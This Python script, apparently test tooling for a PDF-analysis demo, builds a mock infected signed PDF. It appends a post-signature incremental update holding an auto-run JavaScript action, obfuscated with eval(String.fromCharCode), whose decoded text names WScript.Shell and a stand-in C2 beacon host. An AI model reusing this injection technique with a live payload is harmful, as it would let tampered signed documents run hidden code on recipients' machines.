from pathlib import Path
from generate_clean_pdf import build_clean_signed_pdf


def build_infected_shadow_pdf(output_path: Path) -> None:
    """
    Membuat PDF simulasi serangan nyata:
    1. Berawal dari PDF bertanda tangan BSrE yang sah.
    2. Disisipi incremental update pasca-TTE (Shadow Attack ala CVE-2026-91814)
       sehingga /ByteRange tidak lagi mencakup akhir file.
    3. Mengandung objek aktif berbahaya (/OpenAction + /JavaScript) berobfuskasi
       nyata (`eval(String.fromCharCode(...))`) untuk demo ekstraksi & deobfuscation JS PDF.
    """
    clean_tmp = output_path.with_suffix(".clean_base.pdf")
    build_clean_signed_pdf(clean_tmp)
    base_bytes = clean_tmp.read_bytes()
    clean_tmp.unlink()

    decoded_js = "app.alert('SIMULASI EXPLOIT: WScript.Shell -> http://c2-attacker.local/beacon')"
    char_codes = ", ".join(str(ord(ch)) for ch in decoded_js)

    evil_incremental_payload = (
        b"\n% --- SIMULATED INCREMENTAL UPDATE (CVE-2026-91814 & CVE-2026-6361) ---\n"
        b"99 0 obj\n"
        b"<< /Type /Action /S /JavaScript /OpenAction true "
        + f"/JS (eval(String.fromCharCode({char_codes}))) >>\n".encode("ascii")
        + b"endobj\n"
        b"%%EOF\n"
    )

    infected_bytes = base_bytes + evil_incremental_payload
    output_path.write_bytes(infected_bytes)
    print(f"[OK] PDF terinfeksi dibuat: {output_path} ({len(infected_bytes)} bytes)")


if __name__ == "__main__":
    out = Path(__file__).resolve().parent.parent / "demo_samples" / "surat_dinas_bsre_terinfeksi.pdf"
    build_infected_shadow_pdf(out)
